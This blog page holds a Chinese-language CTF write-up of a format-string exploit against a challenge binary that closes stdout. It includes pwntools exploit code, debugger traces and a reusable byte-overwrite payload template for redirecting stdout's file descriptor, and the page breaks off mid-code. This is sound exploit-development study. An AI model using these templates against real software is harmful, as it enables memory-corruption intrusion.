<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/20/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/20/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/24/print%E7%9B%B2%E6%89%93%E5%8D%B0+%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A8%A1%E6%9D%BF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/24/print%E7%9B%B2%E6%89%93%E5%8D%B0+%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A8%A1%E6%9D%BF/" class="post-title-link" itemprop="url">print盲打印+格式化漏洞模板</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-08-24 23:07:07" itemprop="dateCreated datePublished" datetime="2022-08-24T23:07:07+08:00">2022-08-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-04-12 17:16:12" itemprop="dateModified" datetime="2023-04-12T17:16:12+08:00">2023-04-12</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>one 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.7</span>_amd64/ld<span class="number">-2.31</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">8024</span>ac0d4b0ace622bc53363057c78623d729080, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000142</span>  <span class="keyword">if</span> (A == execveat) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>有沙盒</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">2056</span>]; <span class="comment">// [rsp+0h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+808h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift:%p\n&quot;</span>, s);</span><br><span class="line">  login();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, you can&#x27;t see anything!!!&quot;</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(s); <span class="comment">/* fmt */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>白给 stack_base</li>
<li>明显的格式化字符串漏洞，但是 <code>close(1)</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> password[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(name, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(password, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;username:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;password:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, password, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, name);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>写满 name 可以泄露 pro_base，绕过 PIE</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>我们先介绍一个 pwntools 工具：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, writes, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个参数表示格式化字符串的偏移</li>
<li>第二个参数表示需要利用 %n 写入的数据，采用字典形式<ul>
<li>将 printf 的 GOT 数据改为 system 函数地址</li>
<li>写法为：<code>&#123;printfGOT:systemAddress&#125;</code> </li>
</ul>
</li>
<li>第三个参数表示已经输出的字符个数</li>
<li>第四个参数表示写入方式<ul>
<li>是按字节（byte-&gt;hhn）双字节（short-&gt;hn）还是四字节（int-&gt;n）</li>
<li>默认值是 byte，即按 hhn 写</li>
</ul>
</li>
<li>fmtstr_payload 函数返回的就是 payload</li>
</ul>
<p>我们断点到 <code>printf</code> 执行处：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x562c1b0674b9</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x7fff2a2d31c0</span> ◂— <span class="string">&#x27;aaaaaaaa&#x27;</span></span><br><span class="line">       vararg: <span class="number">0x7fff2a2d31c0</span> ◂— <span class="string">&#x27;aaaaaaaa&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">100</span>:<span class="number">0800</span>│     <span class="number">0x7fff2a2d39c0</span> —▸ <span class="number">0x7fff2a2d3ac0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">101</span>:<span class="number">0808</span>│     <span class="number">0x7fff2a2d39c8</span> ◂— <span class="number">0xcf2ec36e5e9ffe00</span></span><br><span class="line"><span class="number">102</span>:<span class="number">0810</span>│ rbp <span class="number">0x7fff2a2d39d0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">103</span>:<span class="number">0818</span>│     <span class="number">0x7fff2a2d39d8</span> —▸ <span class="number">0x7f9168f2f083</span> (__libc_start_main+<span class="number">243</span>) ◂— mov    edi, eax</span><br><span class="line"><span class="number">104</span>:<span class="number">0820</span>│     <span class="number">0x7fff2a2d39e0</span> —▸ <span class="number">0x7f9169164620</span> (_rtld_global_ro) ◂— <span class="number">0x50f2700000000</span></span><br><span class="line"><span class="number">105</span>:<span class="number">0828</span>│     <span class="number">0x7fff2a2d39e8</span> —▸ <span class="number">0x7fff2a2d3ac8</span> —▸ <span class="number">0x7fff2a2d5317</span> ◂— <span class="number">0x4244006e77702f2e</span> <span class="comment">/* &#x27;./pwn&#x27; */</span></span><br><span class="line"><span class="number">106</span>:<span class="number">0830</span>│     <span class="number">0x7fff2a2d39f0</span> ◂— <span class="number">0x100000000</span></span><br><span class="line"><span class="number">107</span>:<span class="number">0838</span>│     <span class="number">0x7fff2a2d39f8</span> —▸ <span class="number">0x562c1b06740b</span> ◂— endbr64 </span><br></pre></td></tr></table></figure>
<ul>
<li>如果这里直接覆盖 <code>__libc_start_main+243</code> 的话，会导致程序的栈帧出问题，并且没有什么用（因为每次覆盖都需要一次 fmt，程序循环后又必须要 fmt 才能继续循环）</li>
<li>于是我们瞄准 <code>printf</code> 的内部进行覆盖</li>
</ul>
<p>在 <code>printf</code> 中，真正执行 “%n” 覆盖的函数是 <code>buffered_vfprintf</code>，调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> -&gt; __vfprintf_internal -&gt; buffered_vfprintf</span><br></pre></td></tr></table></figure>
<ul>
<li>如果我们利用 <code>buffered_vfprintf</code> 来覆盖 <code>__vfprintf_internal</code> 的返回地址为 start_addr，就可以在 <code>printf</code> 函数内部实现循环</li>
<li>我们可以利用 <code>printf</code> 间接任意写来覆盖这里</li>
</ul>
<p>测试代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(r.recvline(),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;stack: &quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">pie=u64(r.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>)+p16(<span class="number">0</span>))-<span class="number">0x11a0</span></span><br><span class="line">success(<span class="string">&quot;pie: &quot;</span>+<span class="built_in">hex</span>(pie))</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(fmtstr_payload(<span class="number">6</span>, &#123;stack-<span class="number">0xe8</span>:pie+<span class="number">0x11a0</span>&#125;).ljust(<span class="number">0x200</span>,<span class="string">&quot;\x00&quot;</span>)) <span class="comment"># 因为64位程序前6个参数在寄存器中,所以offset设置为&#x27;6&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>GDB 跟踪：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f66e4605d1f</span> &lt;__vfprintf_internal+<span class="number">1215</span>&gt;    call   buffered_vfprintf                &lt;buffered_vfprintf&gt;</span><br><span class="line">       rdi: <span class="number">0x7f66e477c6a0</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line">       rsi: <span class="number">0x7ffe04f611d0</span> ◂— <span class="number">0x3531256330363125</span> (<span class="string">&#x27;%160c%15&#x27;</span>)</span><br><span class="line">       rdx: <span class="number">0x7ffe04f610f0</span> ◂— <span class="number">0x3000000008</span></span><br><span class="line">       rcx: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改前：（<code>__vfprintf_internal</code> 的返回地址）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffe04f611d0</span><span class="number">-0xe8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│         <span class="number">0x7ffe04f610e8</span> —▸ <span class="number">0x7f66e45f0d3f</span> (<span class="built_in">printf</span>+<span class="number">175</span>) ◂— mov    rcx, qword ptr [rsp + <span class="number">0x18</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改后：（覆盖为 main_addr）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffe04f611d0</span><span class="number">-0xe8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x7ffe04f610e8</span> —▸ <span class="number">0x55669931c1a0</span> ◂— endbr64 </span><br></pre></td></tr></table></figure>
<p>因为程序会 <code>close(1)</code>，所以不能直接用 <code>printf(%p)</code> 来泄露 libc_base，但是在我们用 main 覆盖 <code>__vfprintf_internal</code> 的返回地址后，其参数 <code>_IO_2_1_stdout_</code> 指针残留在栈上（如果我们直接覆盖 main 的返回地址，就没有这样的效果）</p>
<p>我们可以利用这个指针修改 <code>_IO_2_1_stdout_-&gt;fileno</code> 为 “2” 重新获得输出，然后 ORW</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f0e2d3056a0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f0e2d3056a0</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad28a7</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f0e2d3056a8</span> (_IO_2_1_stdout_+<span class="number">8</span>) —▸ <span class="number">0x7f0e2d305723</span> (_IO_2_1_stdout_+<span class="number">131</span>) ◂— <span class="number">0x3067e0000000000a</span> <span class="comment">/* &#x27;\n&#x27; */</span></span><br><span class="line">... ↓     <span class="number">6</span> skipped</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x7f0e2d3056e0</span> (_IO_2_1_stdout_+<span class="number">64</span>) —▸ <span class="number">0x7f0e2d305724</span> (_IO_2_1_stdout_+<span class="number">132</span>) ◂— <span class="number">0x2d3067e000000000</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x7f0e2d3056e8</span> (_IO_2_1_stdout_+<span class="number">72</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x7f0e2d305708</span> (_IO_2_1_stdout_+<span class="number">104</span>) —▸ <span class="number">0x7f0e2d304980</span> (_IO_2_1_stdin_) ◂— <span class="number">0xfbad208b</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x7f0e2d305710</span> (_IO_2_1_stdout_+<span class="number">112</span>) ◂— <span class="number">0x1</span> <span class="comment">/* target */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x7f0e2d305718</span> (_IO_2_1_stdout_+<span class="number">120</span>) ◂— <span class="number">0xffffffffffffffff</span></span><br></pre></td></tr></table></figure>
<ul>
<li>我们需要先把 <code>_IO_2_1_stdout_</code> 修改为 <code>_IO_2_1_stdout_+112</code> 然后再改 <code>fileno</code></li>
<li>注意：<code>_IO_2_1_stdout_+112</code> 的倒数第2字节需要爆破，每次都有 1/16 的概率</li>
</ul>
<p>因为我们只覆盖最后4字节，所以 fmtstr_payload 不能使用，不过我在这里给出一个专门覆盖低4字节的 fmt 模板：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">bit=random.randint(<span class="number">1</span>,<span class="number">15</span>)*<span class="number">0x10</span>+<span class="string">&quot;[offset]&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bit))</span><br><span class="line"><span class="keyword">if</span> (bit-<span class="number">0x10</span>&lt;<span class="number">0</span>): </span><br><span class="line">    bit=bit+<span class="number">0xf0</span></span><br><span class="line">off=[<span class="string">&quot;[last]&quot;</span>,bit+<span class="string">&quot;(1)&quot;</span>]</span><br><span class="line">ptr=[<span class="string">&quot;[stack]&quot;</span>,<span class="string">&quot;[stack+1]&quot;</span>]</span><br><span class="line"></span><br><span class="line">pre=<span class="number">0</span></span><br><span class="line">fmt=<span class="string">&quot;&quot;</span></span><br><span class="line">data=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ptr:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> step <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    min_num=<span class="number">0xFFFF</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(off)):</span><br><span class="line">        <span class="keyword">if</span> (off[i]&lt;min_num):</span><br><span class="line">            min_num=off[i]</span><br><span class="line">            min_idx=i</span><br><span class="line">    fmt+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(min_num-pre)+<span class="string">&quot;c%&quot;</span>+<span class="built_in">str</span>(step+<span class="string">&quot;[index]&quot;</span>)+<span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    data+=p64(ptr[min_idx])</span><br><span class="line">    off[min_idx]=<span class="number">0xFF</span></span><br><span class="line">    pre=min_num</span><br><span class="line"></span><br><span class="line">payload = fmt.ljust(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)+data</span><br></pre></td></tr></table></figure>
<ul>
<li><code>[last]</code>：目标地址的最后1字节</li>
<li><code>[offset]</code>：目标地址的倒数第2字节的偏移（<code>bit</code>为倒数第2字节，并且需要爆破）</li>
<li><code>[stack]</code>：位于 stack 上的指针，指向将要被修改的地址（间接修改）</li>
<li><code>[index]</code>：格式化字符串的偏移（可以用 <code>fmtarg</code> 命令快速获取）</li>
</ul>
<p>由于程序需要在覆盖 <code>_IO_2_1_stdout_</code> 最后两字节的同时，修改 main 的返回地址为 main，所以对这个模板做了些改动：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">start=pie+<span class="number">0x11a0</span></span><br><span class="line">bit=random.randint(<span class="number">1</span>,<span class="number">15</span>)*<span class="number">0x10</span>+<span class="number">0x6</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bit))</span><br><span class="line"><span class="keyword">if</span> (bit-<span class="number">0x10</span>&lt;<span class="number">0</span>): </span><br><span class="line">    bit=bit+<span class="number">0xf0</span></span><br><span class="line">off=[<span class="number">0x10</span>,bit+<span class="number">1</span>]</span><br><span class="line">ptr=[stack-<span class="number">0x80</span>,stack-<span class="number">0x7F</span>]</span><br><span 